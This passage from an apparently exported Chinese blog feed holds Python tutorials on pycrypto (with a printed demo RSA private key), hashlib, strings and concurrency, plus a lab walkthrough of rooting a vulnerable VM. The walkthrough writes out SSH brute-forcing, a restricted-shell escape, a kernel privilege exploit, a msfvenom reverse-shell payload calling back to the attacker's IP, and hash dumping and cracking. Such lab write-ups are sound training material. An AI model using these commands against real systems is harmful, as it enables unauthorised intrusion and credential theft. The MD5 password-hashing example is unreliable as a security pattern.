    <content type="text"><![CDATA[python-pycrypto模块学习 12345678910111213141516&gt; pycrypto模块时python中来处理加密解密等信息安全相关的一个重要模块&gt; 对称加密方式：&gt; &gt; AES&gt; DES&gt; ARC4&gt; 散列值计算：&gt; &gt; MD5&gt; SHA&gt; HMAC&gt; 公钥加密和签名：&gt; &gt; RSA&gt; DSA&gt; 生成公私密钥123456789101112131415161718192021222324252627282930313233343536373839#伪随机数生成器random_generator = Random.new().read#rsa算法生成实例rsa = RSA.generate(1024,random_generator)#master的密钥对的生成private_pem = rsa.exportKey()#生成公私钥对文件with open('master-private.pem','wb') as f: f.write(private_pem)public_pem = rsa.publickey().exportKey()with open('master-public.pem','wb') as f: f.write(public_pem)"""-----BEGIN PUBLIC KEY-----MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDXamjBCTqlzBxnk0B00G/Ae6hkpKS/0zz0Q7qvCGOjWttrmPyvDdMgxyGnJri4PHvMkN0jAMbU32NKN8ojcoKOdH434DPL/ClbqMi5usk70HLDpfhWs/ylOJ6H01JyIzONnZsr3MdOde8RNvn2ZGjk3JqXDfOzB3T0Ad0F3p7OBwIDAQAB-----END PUBLIC KEY----------BEGIN RSA PRIVATE KEY-----MIICXAIBAAKBgQDXamjBCTqlzBxnk0B00G/Ae6hkpKS/0zz0Q7qvCGOjWttrmPyvDdMgxyGnJri4PHvMkN0jAMbU32NKN8ojcoKOdH434DPL/ClbqMi5usk70HLDpfhWs/ylOJ6H01JyIzONnZsr3MdOde8RNvn2ZGjk3JqXDfOzB3T0Ad0F3p7OBwIDAQABAoGAeVSc9gUtvE7PvOLqjiEMoJzFxxIZHVZsYaR4VLfj7xFwvxTnVe3yeebPJKehqVuf2yPI+jsowqOj+ByeRQLtVyjoZH7aW6uZQcKUtMrAMgcZouIKpKVWFhjWguFlCExsfi8EqzxVsBPBkHynqkU69IB4yPB1AMRb4ZcGsYvCgNECQQDpBoiaMD72+YObbnXKhqW8PxU6/ylZvZL+wFE4Qwcu0nclni/vMMkrxK8oZvAiVOqBjCSXwcA6zZXLMZppBJaZAkEA7Kdo+7fCUyAeivzoYGHKE8Kmr/RTHW7oSgz1bBMdzAugsO8zuNGAfMnLYXTGBJFlfPQuOW3W6Q5UKHppV0uNnwJBAL0kU36ryH/ZGWzxJOUFk8MPhSEE+cBgss7atVIwfcUQiitbkdbZR4CiPfZST3neaRZL9WvElU5ljr+GfKnfUokCQA5LwqzKGgQZgZ7VzlfcMG/nJ1ijws2ZYJDwnXbM5NTpsuhdWtuEVGW1bwLRIhEuk1nsCkrP1ta3VeAoHOr4FnMCQDxnFKPCpjRSEM96xFDNgNh+66wgKg/SXMY5E7e0/LvBoFcJauclu+cP8eaqP0zasVR/xqQT4y091vSZzIADJLA=-----END RSA PRIVATE KEY-----""" 利用python对RSA根据公私钥加解密1234567891011121314151617181920#RSA使用公私钥加解密数据：from Crypto.PublicKey import RSAfrom Crypto.Cipher import PKCS1_v1_5 as Cipher_phcs_v1_5import base64message = 'hello demos this is a plian text!'with open('./master-public.pem','r') as f: key = f.read() rsakey = RSA.importKey(key) #导入读取到的公钥 cipher = Cipher_phcs_v1_5.new(rsakey) #实例化 cipher_text = base64.b64encode(cipher.encrypt(message)) #这里需要注意的一点是，py2可以直接将str加密，而py3要转换为bytes # cipher_text = base64.b64encode(cipher.encrypt(message).encode(encoding = 'utf-8')) #语句如下 print cipher_textwith open('./master-private.pem','r') as f: key = f.read() rsakey = RSA.importKey(key) cipher = Cipher_phcs_v1_5.new(rsakey) text = cipher.decrypt(base64.b64decode(cipher_text),"ERROR") print text #py2这里返回的是str类型的，py3返回的是bytes，需要自己转换 总结 在python中libnum、gmpy2、pycrypto在密码学中的应用广泛，也特别方便。]]></content>
      <categories>
        <category>python</category>
        <category>密码学</category>
      </categories>
      <tags>
        <tag>编程</tag>
        <tag>python</tag>
        <tag>pycrypto</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python常用模块—-hashlib]]></title>
    <url>%2F2018%2F08%2F30%2Fpython%E5%B8%B8%E7%94%A8%E6%A8%A1%E5%9D%97%E2%80%94-hashlib%2F</url>
    <content type="text"><![CDATA[python常用模块——hashlib 1234&gt; python的hashlib提供了常见的摘要算法，如MD5,SHA1等&gt; 摘要算法又称为hash算法、散列算法。它通过一个函数把任意长度的数据转换为一个长度的固定的数据串（通常用十六进制字符串表示）&gt; 摘要算法反推很困难，因为摘要函数是单向的，对原始数据做一个bit的修改，都会导致计算出的摘要完全不同&gt; hashlib模块学习12345678910111213141516171819202122#coding:utf-8import hashlibmd5 = hashlib.md5()md5.update('how to use md5 in python hashlib?')#使用生成实例的update方法进行MD5的转换，同时，update会将每次的字符串拼接，如果想要不同的值，每次过后都得实例化print md5.hexdigest() #返回摘要信息，以十六进制数据返回print md5.digest() #返回摘要信息，以二进制数据返回#刚才说过的update，如果数据量很大，可以使用它拼接#MD5是最常见的摘要算法，速度很快，生成结果是固定的128 bit字节，通常用一个32位的16进制字符串表示md52 = hashlib.md5()md5.update('how to use md5 in')md5.update('python hashlib?')print md5.hexdigest()#SHA1的结果是160 bit字节，通常用一个40位的16进制字符串表示#有没有可能两个不同的数据通过某个摘要算法得到了相同的摘要？完全有可能，因为任何摘要算法都是把无限多的数据集合映射到一个有限的集合中。这种情况称为碰撞sha1 = hashlib.sha1()sha1.update('how to use sha1 in ')sha1.update('python hashlib?')print sha1.hexdigest() 实例1.进行hash爆破： 123456789101112#coding:utf-8import stringimport hashliba = string.digits + string.lowercase + string.uppercasefor i in a: for j in a: for k in a: for m in a: s = hashlib.md5(i+j+k+m).hexdigest()[0:6] if s == '9bf514': print i+j+k+m 2.用hashlib模拟用户登录，以及password值加盐存储： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556#coding:utf-8import re, hashlibdic = &#123; 'syq123': '506420d6fc050439850f1cb80eb70b9c', 'feifei': 'f95f65d787a87a5e3d32c61b3f7e9bec', 'zsg123': '87c34b8d2950946df7a987a990cad99f'&#125;def get_md5(password): md5 = hashlib.md5() md5.update(password) return md5.hexdigest()def Salt_get_md5(password,name): return get_md5(password + name + 'salt')def username(): #创建用户 name = raw_input('please input your username!!') if re.match(r'^[a-zA-Z].&#123;2,9&#125;',name): userpassword(name) else: print 'input error!' username()def userpassword(name): password = raw_input('please input your password:') password = Salt_get_md5(password,name) print password dic[name] = password #这里如果用update方法时会出现一个问题，添加进字典的不是变量对应的值，而是输入的变量名称 print dicdef login(): str = 'Please Login' print str.center(25) name = raw_input('please input your username:') password = raw_input('please input your password:') password = Salt_get_md5(password,name) if dic[name] == password: print 'Login Success!' else: print 'Login faild! username or password error!' login()if __name__ == '__main__': ch = raw_input('请选择1或2:1-&gt;登录，2-&gt;注册') # print type(ch) if ch == '1': login() elif ch == '2': username() ch = raw_input('请选择1或2:1-&gt;登录，2-&gt;退出') if ch == '1': login() elif ch =='2': exit('bye!!!')]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>编程</tag>
        <tag>python</tag>
        <tag>hashlib</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python字符操作]]></title>
    <url>%2F2018%2F08%2F29%2Fpython%E5%AD%97%E7%AC%A6%E6%93%8D%E4%BD%9C%2F</url>
    <content type="text"><![CDATA[字符串操作需求 123456&gt; string模块定义了一些常用的属性（包含所有的数字，字母，可打印的所有ascii码等）&gt; python的字符串操作可以通过两部分的方法函数基本上就可以解决所有的字符串操作需求：&gt; 1.python的字符串属性函数&gt; 2.python的string模块&gt; 一次python对字符的操作，人生苦短!&gt; 文档练习实例如下：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109# coding:utf-8import string"""string模块定义了一些常用的属性（包含所有的数字，字母，可打印的所有ascii码等）python的字符串操作可以通过两部分的方法函数基本上就可以解决所有的字符串操作需求：1.python的字符串属性函数2.python的string模块"""#1.字符串输出格式对齐 str = 'PyTHON heLLo'print str.center(20) #生成20个字符长度，str处于中间位置print str.ljust(20) #生成20个字符，str左对齐print str.rjust(20) #2.大小写转换print str.upper() #转大写print str.lower() #转小写print str.capitalize() #字符串首字母大写，其余小写print str.swapcase() #大小写对换print str.title() #以分隔符为标记，首字符为大写，其余为小写 #3.字符串判断条件str1 = '01234'print str1.isalnum() #判断是否全是数字和字母，并至少有一个字符print str1.isdigit() #判断是否全是数字，并至少有一个字符 str2 = 'string' print str2.isalnum() #判断是否全是数字或字母，并至少有一个字符print str2.isalpha() #判断是否全是字母，并至少有一个字符print str2.islower() #判断是否全是小写字母，当全是小写和数字的组合时也会返回Trueprint str2.isspace() #判断是否全是空白字符，并至少有一个字符print str2.isspace() #判断是否全是大写，如果全是大写和数字也会返回Trueprint str2.istitle() #判断是否每个单词的首字母为大写print str2.startswith('str') #判断字符是否以str开头print str2.endswith('ing') #判断字符是否以ing结尾 #4.字符串搜索定位与替换str3 = 'string IEarn'print str3.find('z') #查找字符串，没有则返回-1，有则返回查找到的第一个索引print str3.rfind('n') #返回索引的最后一次匹配print str3.index('s') #没有匹配则报错，如果匹配到则和find类似，返回第一次索引print str3.count('a') #返回字符串中匹配的次数print str3.replace('n','N') #搜索替换print str3.strip('n') #删除字符串首尾匹配的字符，通常用于默认删除回车符print str3.lstrip('n') #左配符print str3.rstrip('n') #右配符 str4 = 'tab' print str4.expandtabs() #把制表符转换为空格print str4.expandtabs(5)#指定空格数 #5.字符串编码与解码 str5 = "字符串学习"print str5print str5.decode('utf-8') #6.字符串分割变换 str6 = 'Learn string'print '-'.join(str6) str7 = ['Learn','string']print '-'.join(str7) print str6.split('n')print str6.split('n',1) print str6.rstrip('n')print str6.rsplit('n',1)print str6.splitlines()print str6.partition('n')print str6.rpartition('n') #7.打印出一些常用的字符print string.lettersprint string.ascii_letters #两个都是打印出大小写字母 print string.lowercaseprint string.ascii_lowercase #打印小写字母 print string.uppercaseprint string.ascii_uppercase #打印大写字母 print string.digits #打印十进制数字print string.octdigits #打印八进制数字print string.hexdigits #打印十六进制数字print string.printable #打印数字，大小写字母和特殊字符print string.punctuation #打印特殊字符print string.whitespace #打印一些如制表符一样的符号 #8.string中定义的方法"string.capwords(s, sep=None)是多个字符串方法的组合split(),capitalize(),join()"s = 'ahelloaworld'print string.capwords(s, 'a')#等价于：print 'a'.join([i.capitalize() for i in s.split('a')]) #实例：生成200的随机优惠券（长度是20位的） import randomkey = string.letters + string.digitsfor i in range(200): k = [random.choice(key) for i in range(20)] print ''.join(k) 练习图示：]]></content>
      <tags>
        <tag>编程</tag>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[超级玛丽靶机渗透]]></title>
    <url>%2F2018%2F08%2F19%2F%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%2F</url>
    <content type="text"><![CDATA[靶机渗透 以前看到一篇关于靶机渗透的文章，看了一下觉得比较有意思，所以下载下来玩了一下。原文链接 搭建环境靶机IP：192.168.0.105 攻击主机IP：192.168.0.106 渗透过程 靶机只有一个登陆界面，所以端口扫描来一波 nmap.exe -sV -p- -T5 192.168.0.105 发现开了22和8180端口，访问一下8180端口，可以访问，就从8180端口入手，发现啥都没有，目录扫描走一波 sudo dirb http://192.168.0.105:8180 /usr/share/dirb/wordlists/big.txt 发现一个vhosts目录，访问以后得到如下信息：发现有服务名，修改本地hosts文件访问一下 然后访问[http://mario.supermariohost.local:8180/ 得到如下界面，并没有发现什么有用的信息，再来一次目录扫描（这里说明一下，本来是没有扫到东西的，所以看了一下原文，发现是扫出来的，也许是字典进行了改进，在后文评论中看到马里奥的弟弟是luigi ，emmm。。果然是） 访问一下地址：发现一串英文，利用cewl对连接进行爬取然后生成一个自定义的字典 ，这里是对一些单词的提取，针对可能有用的进行提取cewl &lt;http://mario.supermariohost.local:8180/&gt; -d -w /root/Desktop/666.txt 利用生成的自定义字典使用john生成一个自定义的密码字典 john --wordlist=/home/dest/666.txt --stdout --rules &gt; 777.txt 这里联想到前面的那个目录luigi和生成的密码，然后对22端口进行爆破 hydra -l luigi -P /home/toml/777.txt 192.168.0.105 ssh -t 20 得到ssh的账号密码，进行登录，登录成功以后发现shell权限被限制了，和python进行沙盒逃逸挺像的 在原文中有一篇关于内网渗透中绕过shell限制的文章：www.4hou.com/penetration/11674.html ，通过awk ‘BEGIN{system(“/bin/bash”)}’ 绕过限制,由于测试过进行总结，所以靶机再没重启 然后进行提权：通过查看内核发现是3.13.0的内核版本，通过公开的提权程序进行提权：https://www.exploit-db.com/raw/37292/，下载以后是html,修改后缀名进行编译执行 gcc 77.c -o test 拿到root权限 提权成功后在root目录下发现了flag.zip,解压发现需要密码： 将靶机上的flag压缩包下载到本地，利用msf生成后门程序，在靶机上下载执行： sudo msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.0.106 LPORT=7777 -f elf &gt; /var/www/html/5.elf 利用fcrackzip爆破压缩包的密码 fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt flag.zip 查看flag发现要拿到所有的账户密码，这个时候已经在msf上反弹shell了，所以先把所有的hash抓下来 run post/linux/gather/hashdump 然后利用刚才破解的压缩包密码生成字典，将密码保存到一个新的文件夹中，然后生成 john --wordlist=/home/toml/newpass.txt --stdout --rules &gt; newpasse.txt 加载字典，然后本地破解hash，得到所有的账户密码： john --wordlist=/home/toml/newpasse.txt /home/toml/.msf4/loot/20180819175754_default_192.168.0.105_linux.hashes_331263.txt 利用得到的账户密码均登陆成功：渗透完成 总结 本次靶机的渗透测试，看了表哥的文章，思路清晰，收获很多，是一次学习的过程。]]></content>
      <categories>
        <category>渗透</category>
      </categories>
      <tags>
        <tag>渗透</tag>
        <tag>靶机</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python进程池和线程池]]></title>
    <url>%2F2018%2F06%2F28%2Fpython%E8%BF%9B%E7%A8%8B%E6%B1%A0%E5%92%8C%E7%BA%BF%E7%A8%8B%E6%B1%A0%2F</url>
    <content type="text"><![CDATA[python进程池和线程池学习 前几天学习了python的多进程通信，是python标准库中支持的多进程并发模块multiprocessing ，主要学习了它常用的两个类和几种进程间通信的方法，本文基于这一点继续拓展python的并发中的线程池和进程池。 多进程和多线程 按照书上的话来说“进程是资源分配的最小单位，线程是CPU调度的最小单位 ”但在实际中要分清楚它们的区别与联系才可以运用好多线程和多进程。多进程与多线程的区别 进程是程序在计算机上的一次执行活动。当你运行一个程序，你就启动了一个进程。显然，程序是死的(静态的)，进程是活的(动态的)。进程可以分为系统进程和用户进程。凡是用于完成操作系统的各种功能的进程就是系统进程，它们就是处于运行状态下的操作系统本身；所有由你启动的进程都是用户进程。进程是操作系统进行资源分配的单位。在Windows下，进程又被细化为线程，也就是一个进程下有多个能独立运行的更小的单位。 在同一个时间里，同一个计算机系统中如果允许两个或两个以上的进程处于运行状态，这便是多任务。 先贴一张图来看多线程和多进程再不同维度的对比： 基于上图总结： 需要频繁创建销毁的优先使用多线程，常见的是web服务器，来一个请求，建立一次连接、通信结束以后销毁连接，所以要使用多线程，如果使用多进程，创建和销毁的代价非常大。 需要进行大量计算的优先使用多线程，由于大量计算需要消耗大量的CPU资源、切换频繁，如图像处理、算法处理，使用多线程切换简单，CPU的利用率高。 处理关系相关性强的优先用多进程、相关性弱的优先用多线程。比如：服务器进行消息的收发和消息的处理，相关性不是很强，使用多进程可以提高并发速度；针对消息的处理有消息解码、业务处理等多种方式，这个时候需要数据间的共享，使用多线程会提高并发速度。 基于分布式的多核多机的优先使用多进程。 满足不同的需求，结合它们的特性选用合理的方式。 通过队列实现多线程和多进程的并发 使用multiprocessing.JoinableQueue实现多进程并发 JoinableQueue是multiprocessing的一种数据结构，它本质上是一个FIFO队列，它与一般队列的不同在于它的多进程是安全的，会自动解决互斥和死锁的问题。JoinableQueue主要可以用来存放执行的任务和收集任务的执行结果。 通过多进程并发打印26个字母 12345678910111213141516171819202122232425262728293031323334353637from multiprocessing import JoinableQueueimport multiprocessingimport random, timedef read(q): while True: try: #这里是多进程并发的要点，q是一个JoinableQueue对象，支持get方法读取第一个元素，如果q中没有元素，进程就会阻塞，直至q中被存入新元素 value = q.get() print('GET &#123;&#125; from queue.'.format(value)) time.sleep(random.random()) finally: q.task_done()#通过多进程将26个字母打印出来def main(): #定义一个存放任务的JoinableQueue对象 q = multiprocessing.JoinableQueue() #实例化两个Process对象（每个对象对应一个子进程）target是实现每个任务工作中的具体函数，args是target函数的参数 pw1 = multiprocessing.Process(target=read, args=(q,)) pw2 = multiprocessing.Process(target=read, args=(q,)) #将子进程设为守护进程———在主进程结束后随之结束 pw1.daemon = True pw2.daemon = True #子进程就开始独立于父进程运行了，它会在单独的进程里调用target引用的函数——在这里即read函数，它是一个死循环，将参数q中的数一一读取并打印出来 pw1.start() pw2.start() #实际上start执行以后进程就阻塞了，由于JoinableQueue对象没有传入元素，等待传入元素才开始执行 for x in [chr(ord('A')+i) for i in range(26)]: q.put(x) try: #这里是查询q中的数据是否已经读完，如果没有读完阻塞程序，等待q中的数据读完才开始继续执行 q.join() except KeyboardInterrupt: print('stopped by hand')if __name__ == "__main__": main() 通过这个实例可以看出python通过JoinableQueue实现多进程并发的优雅 通过队列实现多线程的并发 程序的实现与多进程差别不大，只是这里不用multiProcessing.JoinableQueue进行队列的操作，一般的队列就可以满足要求 通过队列实现多线程并发实例：打印26个字母（代码和多进程的差别并不大） 1234567891011121314151617181920212223242526272829import time, randomimport threading, queuedef read(q): while True: try: value = q.get() print('GET &#123;&#125; from queue.'.format(value)) time.sleep(random.random()) finally: q.task_done()def main(): q = queue.Queue() pw1 = threading.Thread(target=read, args=(q,)) pw2 = threading.Thread(target=read, args=(q,)) pw1.daemon = True pw2.daemon = True pw1.start() pw2.start() for x in [chr(ord('A')+i) for i in range(26)]: q.put(x) try: q.join() except KeyboardInterrupt: print('stopped by hand')if __name__ == "__main__": main() 多线程补充 既然说到了用队列实现多线程并发，再补充通过threading初始化，不调用队列实现多线程并发，这里要多出一个线程不安全的问题，用线程锁来解决 不设计线程锁实例：(以前测试的时候出现线程不安全的问题，现在运行以后没有了，应该是python版本的修复) 123456789101112131415161718192021import threadingclass MyThread(threading.Thread): def __init__(self): threading.Thread.__init__(self) def run(self): global n print(n,self.name) n += 1if "__main__" == __name__: n = 0 ThreadList = [] for i in range(0, 10): t = MyThread() ThreadList.append(t) for t in ThreadList: t.start() for t in ThreadList: t.join 设计线程锁的实例（尽管现在测试没有出现线程不安全的问题，还是将它作为补充） 12345678910111213141516171819202122232425import threading, timeclass MyThread(threading.Thread): def __init__(self): threading.Thread.__init__(self) def run(self): global n, lock time.sleep(1) if lock.acquire(): print(n , self.name) n += 1 lock.release()if "__main__" == __name__: n = 1 ThreadList = [] lock = threading.Lock() for i in range(1, 200): t = MyThread() ThreadList.append(t) for t in ThreadList: t.start() for t in ThreadList: t.join() 通过进程池和线程池来实现并发设计 通过进程池和线程池实现并发设计，也算是对上一篇多进程学习的补充与应用 进程池 进程池的使用有四种方式：apply_async、apply、map_async、map。其中apply_async和map_async是异步的，也就是启动进程函数之后会继续执行后续的代码不用等待进程函数返回。apply_async和map_async方式提供了一些获取进程函数状态的函数：ready()、successful()、get()。join()放在close()后面，是多进程中说到过的 通过一个实例来体现Python的进程池中的四种方法的特点，主要的区别是在异步 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061import multiprocessingimport timedef func(msg): print('msg:',msg) # time.sleep(1) return 'func_return: %s' % msgif __name__ == "__main__": #apply_async print('\n------apply_async--------') pool = multiprocessing.Pool(processes=4) results = [] for i in range(10): msg = 'hello fsdfs %d' % i result = pool.apply_async(func,(msg,)) results.append(result) print('apply_async:不阻塞') for i in results: i.wait() #等待进程函数执行完毕 for i in results: if i.ready(): #判断进程函数是否已经启动了 if i.successful(): #判断进程函数是否执行成功 print(i.get()) #输出进程函数的返回值 #apply print('\n----------apply---------') pool = multiprocessing.Pool(processes=4) results = [] for i in range(10): msg = 'hello fsdfs %d' % i result = pool.apply(func,(msg,)) results.append(result) print('apply:阻塞') #执行完func才可以执行该语句 pool.close() pool.join() print(results) #map print('\n---------map-----------') args = [1,2,3,4,5] pool = multiprocessing.Pool(processes=5) return_data = pool.map(func,args) print('map:阻塞') #执行完func才执行该语句 pool.close() pool.join() print(return_data) #map_async print('\n-------map_async---------') pool = multiprocessing.Pool(processes=5) result = pool.map_async(func,args) print('ready:',result.ready()) print('不阻塞') result.wait() #等待所有进程函数执行完毕 if result.ready(): #判断进程函是否已经启动了 if result.successful(): #判断进程函数是否执行成功 print(result.get()) #输出进程函数的返回值 线程池 线程池使用multiprocessing提供的线程池，线程池的使用有四种方式：apply_async、apply、map_async、map，代码与进程池类似。下面直接贴代码，实现的过程与进程池基本一致 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061from multiprocessing.dummy import Pool as ThreadPoolimport timedef func(msg): print('msg:',msg) # time.sleep(1) return 'func_return: %s' % msgif __name__ == "__main__": #apply_async print('\n------apply_async--------') pool = ThreadPool(processes=4) results = [] for i in range(10): msg = 'hello fsdfs %d' % i result = pool.apply_async(func,(msg,)) results.append(result) print('apply_async:不阻塞') for i in results: i.wait() #等待进程函数执行完毕 for i in results: if i.ready(): #判断进程函数是否已经启动了 if i.successful(): #判断进程函数是否执行成功 print(i.get()) #输出进程函数的返回值 #apply print('\n----------apply---------') pool = ThreadPool(processes=4) results = [] for i in range(10): msg = 'hello fsdfs %d' % i result = pool.apply(func,(msg,)) results.append(result) print('apply:阻塞') #执行完func才可以执行该语句 # pool.close() # pool.join() print(results) #map print('\n---------map-----------') args = [1,2,3,4,5] pool = ThreadPool(processes=5) return_data = pool.map(func,args) print('map:阻塞') #执行完func才执行该语句 pool.close() pool.join() print(return_data) #map_async print('\n-------map_async---------') pool = ThreadPool(processes=5) result = pool.map_async(func,args) print('ready:',result.ready()) print('不阻塞') result.wait() #等待所有进程函数执行完毕 if result.ready(): #判断进程函是否已经启动了 if result.successful(): #判断进程函数是否执行成功 print(result.get()) #输出进程函数的返回值 对比 通过对比可以发现线程池和进程池的代码差别并不是很大，和前面通过队列实现并发一样，所以在选取以何种方式做并发时还是要结合实际的情况 实例应用 学习了这么多，还是要进行实际运用，接下来利用线程池做一个高并发的爬虫，同时也可以巩固一下爬虫。这个练习是通过线程池结合队列爬取表情包(emmm)，以斗图啦网站为例(https://www.doutula.com) 分析页面，在最新表情中表情包最多，一共有1655页，每一页的连接为：https://www.doutula.com/photo/list/?page=1，变动的知识page={}，所以通过队列来进行遍历。然后分析单个页面的元素：每一个表情包都是由一个a标签来构成，我们需要的是图片链接和表情包名称![](https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1530181891.94.png) 当然，我们查看的时候看到的是浏览器渲染以后的页面，所以元素可能会是动态生成的；如果要查看未渲染之前的图片，直接查看源码，也是一样的。 分析一下图片的连接：该网站使用新浪的图床ws1.sinaimg.cn,多查看几个图片地址发现不一定是ws1子域名 ，可能是是任何ws开头，后面跟数字 ，出现这种情况的原因是：根据HTTP/1.1协议规定，浏览器客户端在同一时间，针对同一域名下的请求有一定数量限制。超过限制数目的请求会被阻塞 ，所以利用不同的子域来绕过限制。这一点其实不影响我们（假如你的正则是直接匹配图片完整连接） 经过测试，网站没有做反爬，接下来就简单了，步骤如下： 获取单个页面用正则匹配img标签的图片地址和图片描述 将获取到的表情包下载保存 改变page参数爬取所有的列表页面 当然，重要的是用上线程池，为了提高爬取速度，再加上进程的通信 代码实现： 设置图片保存的文件夹 1BASE_DIR = os.path.join(os.path.dirname(__file__) + '/pic') 创建三个队列，分别用于图片任务、页面任务、日志记录,用Queue进行进程间的通信 123picqueue = multiprocessing.Queue()pagequeue = multiprocessing.Queue()logqueue = multiprocessing.Queue() 创建两个线程池，分别用于图片任务和页面任务 12picpool = ThreadPool(30)pagepool = ThreadPool(3) 用正则去匹配图片信息，并将获取到的图片链接和描述入队 12345678def get_imglist(html): pattern = re.compile('data-original="(.*?)".*?&lt;p style="display: none"&gt;(.*?)&lt;/p&gt;',re.S) img_list = re.findall(pattern,html) for url, name in img_list: #将图片的后缀加到name中，方便后面的保存 name = name + url[-4:] logqueue.put(url) picqueue.put((name,url)) 获取页面的源码（尽管没有限制，但还是加上UA头和cookie） 123456789101112def get_page(): #进行会话的保持,确保连接的是同一个页面，将同一个页面的爬取完以后再连接下一个页面 http = requests.Session() headers = &#123; 'User-Agent':'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36', 'Cookie':'' &#125; while True: papeid = pagequeue.get() response = http.get('http://www.doutula.com/photo/list/?page=&#123;&#125;'.format(papeid), headers=headers,timeout=2) # print(response.text) get_imglist(response.text) 保存表情包： 12345678910111213def save_file(): #判断当前位置是唯一的连接 http = requests.Session() while True: name, url = picqueue.get() #判断是否已经下载该图片 if not os.path.isfile(os.path.join(BASE_DIR, name)): # req = http.get(url) try: with open(os.path.join(BASE_DIR,name),'wb+') as f: f.write(http.get(url).content) except: error.append([name,url]) 主函数（启动线程池，队列等） 123456789101112131415161718ef main(): if not os.path.isdir(BASE_DIR): os.mkdir(BASE_DIR) # get_page() #将页码放入队列中 for i in range(1,1656): # print(type(i)) pagequeue.put(i) #启动页面任务池 for i in range(3): pagepool.apply_async(get_page) #启动图片任务池 for i in range(30): picpool.apply_async(save_file) while True: print(logqueue.get(),picqueue.qsize(),pagequeue.qsize()) 完整代码如下： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677import reimport osimport requestsimport multiprocessingfrom multiprocessing.pool import ThreadPool#设置图片保存的文件夹,如果运行的py文件存在，os.path.dirname(__file__)输出完整的目录，如果是相对路径，输出为空BASE_DIR = os.path.join(os.path.dirname(__file__) + '/pic')# print(BASE_DIR)#创建三个队列，分别用于图片任务、页面任务、日志记录,用Queue进行进程间的通信picqueue = multiprocessing.Queue()pagequeue = multiprocessing.Queue()logqueue = multiprocessing.Queue()#创建两个线程池，分别用于图片任务和页面任务picpool = ThreadPool(30)pagepool = ThreadPool(3)error = []#用正则去匹配图片信息def get_imglist(html): pattern = re.compile('data-original="(.*?)".*?&lt;p style="display: none"&gt;(.*?)&lt;/p&gt;',re.S) img_list = re.findall(pattern,html) for url, name in img_list: name = name + url[-4:] logqueue.put(url) picqueue.put((name,url))def get_page(): #进行会话的保持 http = requests.Session() headers = &#123; 'User-Agent':'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36', 'Cookie':'' &#125; while True: papeid = pagequeue.get() response = http.get('http://www.doutula.com/photo/list/?page=&#123;&#125;'.format(papeid), headers=headers,timeout=2) # print(response.text) get_imglist(response.text)def save_file(): #判断当前位置是唯一的连接 http = requests.Session() while True: name, url = picqueue.get() #判断是否已经下载该图片 if not os.path.isfile(os.path.join(BASE_DIR, name)): # req = http.get(url) try: with open(os.path.join(BASE_DIR,name),'wb+') as f: f.write(http.get(url).content) except: error.append([name,url])def main(): if not os.path.isdir(BASE_DIR): os.mkdir(BASE_DIR) # get_page() #将页码放入队列中 for i in range(1,1656): # print(type(i)) pagequeue.put(i) #启动页面任务池 for i in range(3): pagepool.apply_async(get_page) #启动图片任务池 for i in range(30): picpool.apply_async(save_file) while True: print(logqueue.get(),picqueue.qsize(),pagequeue.qsize())if __name__ == "__main__": main() 运行结果： 以上是通过正则表达式来做的，下面稍加修改，用解析库来做： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879import osimport requestsimport multiprocessingfrom bs4 import BeautifulSoupfrom multiprocessing.pool import ThreadPoolBASE_DIR = os.path.join(os.path.dirname(__file__) + '/pic')# print(BASE_DIR)#创建三个队列，分别用于图片任务、页面任务、日志记录,用Queue进行进程间的通信picqueue = multiprocessing.Queue()pagequeue = multiprocessing.Queue()logqueue = multiprocessing.Queue()#创建两个线程池，分别用于图片任务和页面任务picpool = ThreadPool(30)pagepool = ThreadPool(3)error = []def get_imglist(html): soup = BeautifulSoup(html,'lxml') img_list = soup.find_all('a',class_='col-xs-6 col-sm-3') # print(img_list) for imgs in img_list: try: url = imgs.find('img')['data-original'] name = imgs.find('p',style='display: none').text + url[-4:] except: pass logqueue.put(url) picqueue.put((name,url))def get_page(): #进行会话的保持 http = requests.Session() headers = &#123; 'User-Agent':'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36', 'Cookie':'' &#125; while True: papeid = pagequeue.get() response = http.get('http://www.doutula.com/photo/list/?page=&#123;&#125;'.format(papeid), headers=headers,timeout=2) get_imglist(response.text)def save_file(): #判断当前位置是唯一的连接 http = requests.Session() while True: name, url = picqueue.get() #判断是否已经下载该图片 if not os.path.isfile(os.path.join(BASE_DIR, name)): # req = http.get(url) try: with open(os.path.join(BASE_DIR,name),'wb+') as f: f.write(http.get(url).content) except: error.append([name,url])def main(): if not os.path.isdir(BASE_DIR): os.mkdir(BASE_DIR) #将页码放入队列中 for i in range(1,1656): # print(type(i)) pagequeue.put(i) #启动页面任务池 for i in range(3): pagepool.apply_async(get_page) #启动图片任务池 for i in range(30): picpool.apply_async(save_file) while True: print(logqueue.get())if __name__ == "__main__": main() 总结 本文是对python实现并发的学习总结，具体有python进程并发编程的几种方式以及它们之间的关联与区别，通过实例来体现与利用，最后的实例加上了爬虫的内容，这是再学习安全之余对于编程的学习，安全最后还是离不开代码，相辅相成。]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
